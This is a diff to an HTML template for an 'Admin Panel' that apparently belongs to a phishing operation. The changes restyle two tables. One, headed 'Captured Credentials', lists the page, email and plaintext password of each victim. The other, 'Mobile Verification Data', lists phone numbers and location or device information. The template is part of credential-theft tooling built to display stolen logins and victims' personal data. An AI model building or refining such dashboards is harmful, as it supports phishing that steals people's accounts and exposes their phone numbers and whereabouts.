@@ -2,19 +2,21 @@
 {% block content %}
 
 <h2>Admin Panel</h2>
-<p style="text-align: right;"><a href="/admin/logout" style="color: #dc3545; font-weight: bold;">Logout</a></p>
-<div style="display: flex; gap: 20px; align-items: flex-start;">
+<p style="text-align: right;"><a href="/admin/logout"
+        style="color: #dc3545; font-weight: bold; text-decoration: none;">&larr; Logout</a></p>
 
-    <!-- LEFT: Mobile Data (Phone & Location) -->
-    <div style="flex: 1;">
-        <h3>Mobile Verification Data</h3>
-        <table border="1" cellpadding="8" style="width: 100%;">
-            <thead>
+<div style="display: flex; flex-direction: column; gap: 40px; max-width: 1200px; margin: 0 auto;">
+
+    <!-- TOP: Mobile Data (Phone & Location) -->
+    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+        <h3 style="border-bottom: 2px solid #007bff; padding-bottom: 10px; margin-top: 0;">Mobile Verification Data</h3>
+        <table border="1" cellpadding="12" style="width: 100%; border-collapse: collapse; background: white;">
+            <thead style="background: #e9ecef;">
                 <tr>
-                    <th>ID</th>
-                    <th>Phone</th>
-                    <th>Location</th>
-                    <th>Time</th>
+                    <th style="text-align: left;">ID</th>
+                    <th style="text-align: left;">Phone</th>
+                    <th style="text-align: left;">Location / Device Info</th>
+                    <th style="text-align: left; width: 180px; white-space: nowrap;">Time (PKT)</th>
                 </tr>
             </thead>
             <tbody>
@@ -22,35 +24,36 @@
                 <tr>
                     <td>{{ row.id }}</td>
                     <td>{{ row.phone }}</td>
-                    <td>{{ row.location }}</td>
-                    <td>{{ row.timestamp.strftime('%Y-%m-%d %H:%M') }}</td>
+                    <td style="word-break: break-all;">{{ row.location }}</td>
+                    <td style="white-space: nowrap;">{{ row.timestamp.strftime('%Y-%m-%d %I:%M %p') }}</td>
                 </tr>
                 {% endfor %}
             </tbody>
         </table>
     </div>
 
-    <!-- RIGHT: Credentials (Email & Password) -->
-    <div style="flex: 1;">
-        <h3>Captured Credentials</h3>
-        <table border="1" cellpadding="8" style="width: 100%;">
-            <thead>
+    <!-- BOTTOM: Credentials (Email & Password) -->
+    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+        <h3 style="border-bottom: 2px solid #28a745; padding-bottom: 10px; margin-top: 0;">Captured Credentials</h3>
+        <table border="1" cellpadding="12" style="width: 100%; border-collapse: collapse; background: white;">
+            <thead style="background: #e9ecef;">
                 <tr>
-                    <th>ID</th>
-                    <th>Page</th>
-                    <th>Email</th>
-                    <th>Password</th>
-                    <th>Time</th>
+                    <th style="text-align: left;">ID</th>
+                    <th style="text-align: left;">Page</th>
+                    <th style="text-align: left;">Email</th>
+                    <th style="text-align: left;">Password</th>
+                    <th style="text-align: left; width: 180px; white-space: nowrap;">Time (PKT)</th>
                 </tr>
             </thead>
             <tbody>
                 {% for row in other_data %}
                 <tr>
                     <td>{{ row.id }}</td>
-                    <td>{{ row.page }}</td>
+                    <td><span style="background: #eee; padding: 2px 6px; border-radius: 4px; font-size: 0.9em;">{{
+                            row.page }}</span></td>
                     <td>{{ row.email }}</td>
-                    <td>{{ row.password }}</td>
-                    <td>{{ row.timestamp.strftime('%Y-%m-%d %H:%M') }}</td>
+                    <td><code>{{ row.password }}</code></td>
+                    <td style="white-space: nowrap;">{{ row.timestamp.strftime('%Y-%m-%d %I:%M %p') }}</td>
                 </tr>
                 {% endfor %}
             </tbody>
